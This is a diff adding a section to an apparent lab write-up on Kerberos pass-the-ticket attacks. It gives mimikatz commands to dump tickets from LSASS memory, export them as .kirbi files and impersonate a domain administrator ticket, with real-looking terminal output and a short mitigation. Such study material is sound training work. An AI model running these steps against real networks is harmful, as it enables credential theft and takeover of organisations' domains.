@@ -797,4 +797,114 @@ You can run this attack on the given machine however you will be escalating from
 
 ### Pass the Ticket Overview
 
-Works by dumping the Local Security Authority Subsystem Service (LSASS) memort of the machine
+Works by dumping the Local Security Authority Subsystem Service (LSASS) memory of the machine. LSASS is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.
+
+### Preparing Mimikatz and Dumping Tickets
+
+You will need to run the command prompt as an administrator: use the same credentials as you did to get into the machine. If you don't have an elevated command prompt mimikatz will not work properly.
+
+1.) `cd Downloads` - navigate to the directory mimikatz is in
+
+2.) `mimikatz.exe` - run mimikatz
+
+3.) `privilege::debug` - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
+
+
+
+4.) `sekurlsa::tickets /export` - this will export all of the .kirbi tickets into the directory that you are currently in
+
+At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
+
+When looking for which ticket to impersonate it is recommended looking for an administrator ticket from the krbtgt.
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>ls 
+'ls' is not recognized as an internal or external command, 
+operable program or batch file.
+
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>dir 
+ Volume in drive C has no label. 
+ Volume Serial Number is E203-08FF
+
+ Directory of C:\Users\Administrator\Downloads
+
+08/04/2021  05:19 PM    <DIR>          .
+08/04/2021  05:19 PM    <DIR>          ..
+05/25/2020  03:45 PM         1,263,880 mimikatz.exe
+05/25/2020  03:14 PM           212,480 Rubeus.exe
+08/04/2021  05:19 PM             1,787 [0;1a4140]-1-0-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi 
+08/04/2021  05:19 PM             1,587 [0;293129]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/04/2021  05:19 PM             1,755 [0;35c74]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/04/2021  05:19 PM             1,587 [0;3688e]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/04/2021  05:19 PM             1,595 [0;3d4e7]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+08/04/2021  05:19 PM             1,791 [0;3e4]-0-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi  
+08/04/2021  05:19 PM             1,587 [0;3e4]-2-0-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/04/2021  05:19 PM             1,755 [0;3e7]-0-0-40a50000-CONTROLLER-1$@HTTP-CONTROLLER-1.CONTROLLER.local.kirbi  
+08/04/2021  05:19 PM             1,787 [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi    
+08/04/2021  05:19 PM             1,721 [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi
+08/04/2021  05:19 PM             1,711 [0;3e7]-0-3-40a50000.kirbi
+08/04/2021  05:19 PM             1,791 [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi  
+08/04/2021  05:19 PM             1,791 [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi  
+08/04/2021  05:19 PM             1,721 [0;3e7]-0-6-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi
+08/04/2021  05:19 PM             1,755 [0;3e7]-0-7-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi  
+08/04/2021  05:19 PM             1,647 [0;3e7]-1-0-00a50000.kirbi
+08/04/2021  05:19 PM             1,587 [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/04/2021  05:19 PM             1,587 [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi
+08/04/2021  05:19 PM             1,755 [0;679d0]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/04/2021  05:19 PM             1,755 [0;67a2c]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/04/2021  05:19 PM             1,791 [0;67a68]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi
+08/04/2021  05:19 PM             1,755 [0;67aa1]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi
+08/04/2021  05:19 PM             1,595 [0;701c6]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+              25 File(s)      1,515,553 bytes
+               2 Dir(s)  50,895,810,560 bytes free
+```
+
+### Pass the Ticket with Mimkatz
+
+1.) `kerberos::ptt <ticket>` - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # kerberos::ptt [0;3d4e7]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 
+
+* File: '[0;3d4e7]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
+
+```
+
+2.) Outside of Mimikatz :`klist` - Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>klist
+
+Current LogonId is 0:0x701c6
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ CONTROLLER.LOCAL
+        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 8/4/2021 16:23:16 (local)
+        End Time:   8/5/2021 2:23:16 (local)
+        Renew Time: 8/11/2021 16:23:16 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+```
+
+3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
+
+*Note that this is only a POC to understand how to pass the ticket and gain domain admin the way that you approach passing the ticket may be different based on what kind of engagement you're in so do not take this as a definitive guide of how to run this attack.*
+
+### Mitigation
+
+Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
